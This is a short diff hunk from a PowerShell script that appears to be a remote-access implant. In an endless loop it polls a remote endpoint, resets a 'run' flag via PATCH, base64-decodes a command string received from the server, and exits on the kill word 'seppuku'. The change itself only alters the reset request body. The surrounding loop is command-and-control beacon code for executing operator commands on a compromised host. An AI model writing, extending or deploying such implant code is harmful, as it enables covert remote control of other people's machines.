@@ -17,7 +17,7 @@ while ($true) {
         
         # run command
         if ($r.run -eq $true) {
-            Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"cmd": null, "run": false}' | Out-Null
+            Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{"run": false}' | Out-Null
 
             $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.cmd))
             if ($c -eq "seppuku") { exit }
